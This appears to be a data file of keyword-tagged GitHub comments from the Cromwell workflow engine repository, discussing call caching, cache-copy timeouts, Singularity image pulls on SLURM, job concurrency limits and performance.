Performance,"> You can create a new submission with the same inputs and Cromwell will read from call-cache (i.e. skip) tasks it has already done.; > ; > https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/ https://support.terra.bio/hc/en-us/articles/360047664872-Call-caching-How-it-works-and-when-to-use-it. ah I see, thanks for pointing me here",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116276070:88,cache,cache,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116276070,1,['cache'],['cache']
Performance,> a cache blast + restart is looking better. thanks!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5489#issuecomment-617369958:4,cache,cache,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5489#issuecomment-617369958,1,['cache'],['cache']
Performance,"> for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1685,cache,cache,1685,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['cache'],['cache']
Performance,"> it's mostly a mystery what the summarizer is up to. 🤔 If we didn't want to log updates, maybe yet-another graphite metric to see summarization throughput?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4757#issuecomment-475105132:145,throughput,throughput,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4757#issuecomment-475105132,1,['throughput'],['throughput']
Performance,"> would just need to keep in mind they do the lookup to get the docker size. @illusional well I suppose a `docker_size` argument can just as easily be implemented. After pulling the image can be queried for size. > After BCC2020 I want to revisit this PR, and could allow you to turn off the digest but keep call caching on?. Nope. Not yet anyway. And the code is intrically linked, so it is not going to be a one-liner fix. So this is why I have postponed working on this. This is an interesting thing to revisit at a later date. We use singularity containers on a SLURM backend, using the `singularity-permanent-cache` program to pull the images. For us that really works well, and our login node has contact with the internet, so this change is not really urgent. But for stability it is always nice if an internet connection is not required anymore after all the images are there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-661652343:614,cache,cache,614,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-661652343,1,['cache'],['cache']
Performance,"> 是的，很酷，当您指定一个 docker 时，Cromwell 必须解析映像摘要才能使调用缓存正常工作。; > ; > 如果 Cromwell 无法在线找到 docker，或者您的代理阻止了 Cromwell，或者该映像不在线，则映像摘要无法正确解析，并且调用缓存处于禁用状态。; > ; > 这里有一些进一步的上下文： #6140. I also learned this from the official documents. Our cluster individual cannot use Docker, nor can it be connected to the Internet, so we have to choose between mirroring and Call-cache. Thank you very much for your answer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047374011:349,cache,cache,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047374011,1,['cache'],['cache']
Performance,">For what it's worth, most Cromwell users today use cloud storage which has APIs. @aednichols probably that is the reason why many bugs in local backend are ignored and there are still no way to clean cache through API. At local backend cache is not only slow but also works only half of the time ( https://github.com/broadinstitute/cromwell/issues/6143 ). In our case, our lab has our own servers, so we do not have to spend money on cloud, but cache pain is quite high, we are evaluating if it is worth migrating from cromwell to snakemake",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823:201,cache,cache,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823,3,['cache'],['cache']
Performance,"@Horneth Call cache copying seems to be working! It's relatively slow during ""Backend is copying Cached Outputs"", but the other tasks that run don't get stuck in ""Queued in Cromwell"" or ""Cromwell Overhead"". So I'd say that it works with traditional (not just the file path) call caching. . I don't have a thread dump with file path CC on but I could rerun it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289095387:14,cache,cache,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289095387,3,"['Cache', 'Queue', 'cache']","['Cached', 'Queued', 'cache']"
Performance,"@Horneth From what @ruchim and @rtitle said, it made a huge performance difference on FC alpha. Which makes sense as that list was getting appended to and we do a lot of appending there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2486#issuecomment-317813217:60,perform,performance,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2486#issuecomment-317813217,1,['perform'],['performance']
Performance,"@Horneth There are certainly tradeoffs and I don't disagree w/ what you said. However consider the flip side - by defining A Validation Actor you're allowing for more granular control over performance and fault tolerance down the road, e.g. you could replace it with a router talking to a bank of VAs and doing load balancing, fiddle with its own threadpool, provide validation specific supervision in case of error, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195399500:189,perform,performance,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195399500,2,"['load', 'perform']","['load', 'performance']"
Performance,"@Horneth Yeah, almost exactly that. The only beef I have w/ that is that I'd call the ephemeral VAs behind it as a premature optimization, but it is certainly a valid optimization. Similarly maybe there are N fixed VAs behind it or something like that (I'm not advocating for either).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195429261:125,optimiz,optimization,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195429261,2,['optimiz'],['optimization']
Performance,@Horneth could you add a cache configuration option that will switch on caring about the filenames when caching?; Non-chaching of filenames can get many users in a really big trouble and sometimes screw whole research or medical diagnosis. If I did not discover that the files were not written because of caching my colleagues would have treated cow data as if it was human.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351129209:25,cache,cache,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351129209,1,['cache'],['cache']
Performance,"@Horneth here is my metadata. I enclose first run from which the cache was created. There I made a mistake in input and gave graywhale_in_human_blastp output name for the cow data. In two runs that followed I tried to fix this mistake by giving graywhale_in_cow_blastp instead, but it cached the copy task from the first run, so nothing changed.; [metadata_false_positive.zip](https://github.com/broadinstitute/cromwell/files/1551960/metadata_false_positive.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351070649:65,cache,cache,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351070649,2,['cache'],"['cache', 'cached']"
Performance,"@KevinDuringWork, I guess thanks to you for making N2D, one of the best CPU families on GCP, available on Terra. T2D (AMD Milan) now offers the best price-to-performance ratio. I'm still new to software development. Could you add support to T2D or guide me on how I can accomplish this? thank you very much!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010:158,perform,performance,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010,1,['perform'],['performance']
Performance,"@LeeTL1220 @Horneth I doubt enabling continue on return would work. You are getting timeouts not only when uploading log files, but also when localizing files. Ive observed this occasionally to with wide scatters and multiple workflows. ; It starting to seem more like an api Issue. I know in the cromwell conf there is a property for setting the total number of concurrent workflows, but I do not know if this is extended to the task level. It would be interesting to see whether or not limiting the number of concurrent tasks in a scatter would have any impact on this. That or better scattering the task submission for scatters instead of submitting all tasks basically at once. This is one of our major pain points too. So far the only reasonable solution we have had (other then adjusting api quotas) is just to tell users to rerun a wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559:363,concurren,concurrent,363,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559,2,['concurren'],['concurrent']
Performance,"@LeeTL1220 @Horneth I ran into similar issues when running > 400 Tasks Simultaneously. I would occasionally get 403 from the JES backend from various causes; - size built in function would timeout ; - Pulling the docker image from gcr.io would time out; - occasionally pulling the docker image from docker hub would also time out; - I also observed the above error that you were experiencing as well. I was not able to debug any of them, because of the transient nature. Rerunning the workflow generally fixed the problem. I am also using preemptible instances for the majority of the tasks that were being run, however I do not see how that could be contributing to the issue. If anything i would guess that we are bumping into an api quota and are being throttled by google leading to the timeouts",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300167322:756,throttle,throttled,756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300167322,1,['throttle'],['throttled']
Performance,"@LeeTL1220 if you ran this in a server mode Cromwell, I suggest having a look at the Call Cache Diff endpoint to work out what really caused this call cache miss and in the mean time close this issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-331262988:90,Cache,Cache,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-331262988,2,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"@LeeTL1220 there is doc in the README and CHANGELOG (in this PR) on how to disable it.; For SGE, since it doesn't honor the docker runtime attribute I don't think there can be false positive because of that. ; On a backend that does honor the docker attribute, if a tag is used, then yes it can yield false positives if the tag is updated, since Cromwell won't lookup the hash.; There can be false negatives though on SGE, if you change the value of the docker attribute in the WDL, it won't call cache, although it could because SGE will ignore the docker value anyway.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-292010784:497,cache,cache,497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-292010784,1,['cache'],['cache']
Performance,"@LeeTL1220 whats the driving force behind wanting to run with GCS files locally? It would seem most cost effective (by not having to pay egress at all) to run compute to in GCP. However, if you want to use on-prem resources specifically, then simply make a copy a local copy of workflow inputs to start off with. I think this is an interesting optimization but not really a widespread use case and adds more complexity to how Cromwell has to handle localization strategies. I'm inclined to close this issue but feel free to re-open if this essential to your flow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-424954064:344,optimiz,optimization,344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-424954064,1,['optimiz'],['optimization']
Performance,"@TMiguelT I've moved the singularity cache section back down. Hopefully this is all the comments actioned. Sorry @vsoch, I realised I've been resolving your comments as I actioned them, but I probably should've left them open as they're from your review. Also sorry for what was probably a lot of email spam over the past few hours.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-465407558:37,cache,cache,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-465407558,1,['cache'],['cache']
Performance,"@TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /shared_cluster_dir,${cwd}:${docker_cwd} docker://${docker} sh ${script}; rc=$?; if [ ! -f ${cwd}/execution/rc ]; then; echo ""$rc"" > ${cwd}/execution/rc; fi'; """"""; kill = ""scancel ${job_id}""; kill-docker = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; ``` . EDIT: I changed the config. Instead of using multiple locks (one lock per image) there is now one universal lock. This is because pulling two images at the same time that have a shared layer might also corrupt the cache.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:2531,cache,cache,2531,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,1,['cache'],['cache']
Performance,"@Thib; - Are there docs somewhere? So that I can see how to disable the lookup.; - Doesn't this leave SGE open to false alarm call cache hits when using; tags?. On Tue, Apr 4, 2017 at 9:34 AM, Thib <notifications@github.com> wrote:. > *@Horneth* commented on this pull request.; > ------------------------------; >; > In src/bin/travis/resources/centaur.inputs; > <https://github.com/broadinstitute/cromwell/pull/2139#discussion_r109662641>; > :; >; > > @@ -1,7 +1,7 @@; > {; > ""centaur_workflow.centaur.cromwell_jar"":""gs://cloud-cromwell-dev/travis-centaur/CROMWELL_JAR"",; > ""centaur_workflow.centaur.centaur_branch"":""CENTAUR_BRANCH"",; > - ""centaur_workflow.centaur.conf"":""gs://cloud-cromwell-dev/travis-centaur/multiBackend.conf"",; > + ""centaur_workflow.centaur.conf"":""gs://cloud-cromwell-dev/travis-centaur/multiBackendDockerLookup.conf"",; >; > Revert before merging; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/2139#pullrequestreview-30778280>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXkya-uKJyJCAUfDENTCs3BFzbwoY3ks5rskbLgaJpZM4MyKO1>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-291508178:131,cache,cache,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-291508178,1,['cache'],['cache']
Performance,"@aednichols . I implemented the changes. The lock should have a negligible performance impact. It only locks when cached-copy strategy is used, threads which use other strategies are not blocked by this. (This was already true before the changes). A dictionary is used to keep track which files are being copied within the process. Filesystem lock files are too slow for this because during scatters cromwell creates a lot of threads that need exactly the same file at the same time. . A lock file is now used so other cromwell processes know the file is being copied. The chances of two processes needing the same file at exactly the same time is negligible, so lock files are fast enough here. Due to the `synchronized` lock, there can not be race conditions where more than one thread modifies the dictionary and/or creates the lock file at the same time. (The lock is absolutely necessary for cached-copy to work). The amount of time spent in the lock per thread is negligible. . I implemented a waitOnCopy function which lets a thread wait for the locks in the dictionary on the filesystem to clear. This structure allows a lot of paths to be copied to the cache at the same time. So the copying is still multithreaded, maintaining high performance. Are these changes satisfactory?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-488295703:75,perform,performance,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-488295703,6,"['cache', 'perform', 'race condition']","['cache', 'cached-copy', 'performance', 'race conditions']"
Performance,@aednichols Is there anything else I need to do for this or is it waiting in the review queue?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-785295218:88,queue,queue,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-785295218,1,['queue'],['queue']
Performance,"@aednichols tested that just now. The experience is similar to the ""I don't have git hooks installed"" case (ie see the two final `[error]` messages):; ```; $ sbt compile; [...]; [info] Executing in batch mode. For better performance use sbt's shell; [info] Executing pre-compile script...; [error] You are not running our custom git commit hooks. If you are making changes to the codebase, we recommend doing this (by running 'git config --add core.hooksPath hooks/') to ensure that your cryptographic secrets are not committed to our repository by accident.; [error] If you don't want to set up hooks (if you never intend to commit to the cromwell repo, can be sure that you won't commit secrets by accident, or have already installed git-secrets in this repo separately), you can suppress this error by running with: 'sbt -Dignore-hooks-check=true [...]'; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510938820:221,perform,performance,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510938820,1,['perform'],['performance']
Performance,"@aednichols we didn't talk about it yesterday since some folks were out, so we can talk at the next refinement instead. Short story is... we weren't actually batching those requests anyway from a database perspective so I don't think any performance was lost. I also have a cool trick to share about how to see actually what the database is doing that i used to figure this out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4508#issuecomment-451267229:238,perform,performance,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4508#issuecomment-451267229,1,['perform'],['performance']
Performance,"@aednichols, @ruchim is correct, it's why the JMUI really doesn't perform well (Sometimes crashes) when thousands of workflows with subworkflows are submitted, because we do what you've described for filtering out subworkflows in a paginated way on the front end. This is the issue described in #3240. I appreciate the question though, although we have been making changes to cromwell API to support JMUI, it is worth thinking through each one and which team should be accommodating the use case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3608#issuecomment-394418950:66,perform,perform,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3608#issuecomment-394418950,1,['perform'],['perform']
Performance,"@aednichols. No problem. It also turns out that the SQLite file database performs rather slowly. This is due to cromwell doing a lot of transactions, and these are severely bottlenecked by filesystem i/o limits. The amount of i/o operations per second on NFS is rather low so it chokes cromwell performance quite a bit when running a job with multiple samples. This shows that there is room for improvement in Cromwell's design (why are there more than a hundred thousand database interactions for a 2000 job run?) but that is another matter entirely.; HSQLDB with overflow file has problems of its own, but it is more performant (once the 10 GB+ file has been read at least). This branch works, so if the need arises I can maintain a separate release of cromwell with these changes patched in. I have done that before for some changes in dev that could not wait. For now much much thanks for all your support in getting it this far :heart:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857:73,perform,performs,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857,4,"['bottleneck', 'perform']","['bottlenecked', 'performance', 'performant', 'performs']"
Performance,"@alartin - the concurrent-job-limit limits how many jobs will be in a ""runnable / running"" state at a time. It also has the side effect of limiting how many jobs are submitted when the workflow starts. Scatter jobs do not currently map to AWS Batch Array jobs. It would definitely be a good thing to implement and it would also be an effective way to avoid API request limits.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442973335:15,concurren,concurrent-job-limit,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442973335,1,['concurren'],['concurrent-job-limit']
Performance,"@antonkulaga @cjllanwarne ; I have tested call-caching with hardlinks and cached-copy strategy. For hashing-strategy I used path+modtime. These were the results for the call-caching:. **It works!**. So this part of the docs should be updated indeed. I have no idea why it works though, so I am a bit hesitant to add it to the docs. @cjllanwarne Do you know if anything changed in the code base that made the call-caching work for hard links?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831:74,cache,cached-copy,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831,1,['cache'],['cached-copy']
Performance,"@antonkulaga It appears that changing the `name` only changes the filename of the output produced by your task, but not the actual processing. So I bet if you look at the files produced by the diamond blast task for all 3 workflows you'll see that even though their names differ they have the same content.; Cromwell by default only cares about the content of a file with respect to call caching and its name is ignored. In this case it likely md5ed the files and found they had the same hash so the copy task was cached.; I'll wait for you to confirm that the output files have indeed the same hash before closing this:. ```; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/ab101af5-26ba-45c8-b592-fb37e06a523d/call-diamond_blast/execution/graywhale_in_human_blastp.m8; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/3d75657d-7dc9-4b6f-bbc8-ae579a3fa773/call-diamond_blast/execution/graywhale_in_cow_blastp.m8; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/276d6f9e-15b1-4dc3-a8a7-889414406511/call-diamond_blast/execution/graywhale_in_cow_blastp.m8; ```. should all produce the same hash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351125450:514,cache,cached,514,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351125450,1,['cache'],['cached']
Performance,"@aofarrel I recommend setting a [`concurrent-job-limit`](https://cromwell.readthedocs.io/en/stable/backends/Backends/) value of 1 so that Cromwell only starts one job at once. . The interface between Cromwell and its backends is designed so that resource management happens entirely within the backend. As such, Cromwell never knows how much memory/CPU a backend has; rather the backend is expected to start as many jobs as it can safely handle and stop when it reaches the limit. What you're finding is that the local backend, implemented with Docker, doesn't support that self-management because it is a non-goal of the Docker product itself. Docker tries to start whatever containers you request, immediately. Since I _think_ `concurrent-job-limit` should fully address your problem, I am going to close the issue. If that's not the case feel free to reopen.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-803082272:34,concurren,concurrent-job-limit,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-803082272,2,['concurren'],['concurrent-job-limit']
Performance,"@cjllanwarne -- my understanding is that the read/write functions can't be optionally performed in the command, since the write and read involve file functions --which tend to happen upstream of the command being initiated?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-496240424:86,perform,performed,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-496240424,1,['perform'],['performed']
Performance,"@cjllanwarne @mcovarr you guys are the lucky reviewers! Making the changes to publish cache hit metadata that includes Workflow ID, call name and job index of the source cache hit call.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1447#issuecomment-248118103:86,cache,cache,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1447#issuecomment-248118103,2,['cache'],['cache']
Performance,@cjllanwarne BA-5904 is the JIRA peer to this PR which in no way improves performance. 😉 I agree that the JIRA peers to the PRs that actually do improve performance should get a User Impact like what you describe.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520824354:74,perform,performance,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520824354,2,['perform'],['performance']
Performance,"@cjllanwarne Checkout out #199, a PR into this PR. It refactors `DataAccess`, `Backend`, and `BackendType` around a bit such that the high level workflow manager actor can pass in its data access instance to the backend, OR the various test suites can keep using separate data access instances. . The problem with ""data_access_singleton"" is that the singleton data access seemingly cannot handle the onslaught of our multi-threaded tests. One of our many thread pools around the database seemed to then start returning uncaught(?) errors. Definitely showed some warts in our non-existent load testing... Take a look, decide what you want to keep or jettison, but I do believe that a new database pool / data access should **NOT** be created for each JES `Run`. Otherwise, this branch looks good to go for merge. :+1:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894:417,multi-thread,multi-threaded,417,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894,2,"['load', 'multi-thread']","['load', 'multi-threaded']"
Performance,"@cjllanwarne I agree now that fix will not work, but what i don't see we can perform Topological sort because we have seq of calls instead dependency graph ( Correct me if i am wrong?).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236050063:77,perform,perform,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236050063,1,['perform'],['perform']
Performance,"@cjllanwarne I certainly don't think this needs a unit test for a hotfix. And as there was no unit test added for the introduction of the queue, and many unit and virtually all integration tests exercise this indirectly I'm not sure I see the necessity.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5510#issuecomment-624861371:138,queue,queue,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5510#issuecomment-624861371,1,['queue'],['queue']
Performance,"@cjllanwarne I'd prefer to see it talking to a single point (currently a single VA, as @Horneth & I discussed, if performance, reliability or complexity call for it, to be morphed into something else). I don't care that much if it happens here, but it's not an onerous change to make on this PR. I _will_ care once something else is talking to a VA",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195440254:114,perform,performance,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195440254,1,['perform'],['performance']
Performance,"@cjllanwarne I'm probably misreading the convo but I was reading this to imply that a cromwell-singleton data access object would be getting hit harder from running our unit tests in terms of connections than real life, but in the latter we could conceivably have many thousands of workflows (and thus many, many thousands of tasks) banging on the DB simultaneously. A teensy threadpool isn't going to be able to handle the latter case. Another possibility (which we originally looked at but discarded for non-singleton data access) is to have an actual data access actor, and then that actor can scale horizontally as needed via a router actor. those actors can even be on different machines if CPU load is an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225:700,load,load,700,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225,1,['load'],['load']
Performance,@cjllanwarne I'm using multiple PRs to increase the throughput of data gathering.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775479208:52,throughput,throughput,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6177#issuecomment-775479208,1,['throughput'],['throughput']
Performance,"@cjllanwarne Not sure if this is related (tell me if I should file another issue), but all jobs should be cache hits. Yet, I can see that it is running jobs. This may be due to the ""path"" hashing strategy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255103703:106,cache,cache,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1594#issuecomment-255103703,1,['cache'],['cache']
